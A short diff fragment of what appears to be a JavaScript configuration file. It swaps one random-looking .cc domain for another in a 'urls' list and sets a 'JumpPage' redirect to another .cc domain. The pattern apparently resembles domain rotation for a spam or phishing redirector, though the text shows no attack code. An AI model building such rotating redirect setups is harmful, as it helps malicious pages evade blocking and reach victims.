@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
+	'ovisfhtut.cc',
 	'csaarwbwv.cc',
 	'vzvmsqkhx.cc',
-	'emugzdcxo.cc',
 ];                                                                                                                  
 
 var JumpPage="https://heigmrxo.cc";
